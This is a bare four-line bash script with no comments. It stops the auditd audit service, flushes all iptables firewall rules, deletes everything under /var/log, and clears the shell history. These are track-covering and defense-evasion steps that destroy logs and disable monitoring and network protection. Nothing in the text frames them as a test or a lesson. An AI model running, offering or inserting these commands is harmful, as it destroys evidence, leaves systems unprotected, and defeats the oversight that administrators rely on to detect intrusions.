#!/bin/bash
systemctl stop auditd
iptables -F
rm -rf /var/log/*
history -c
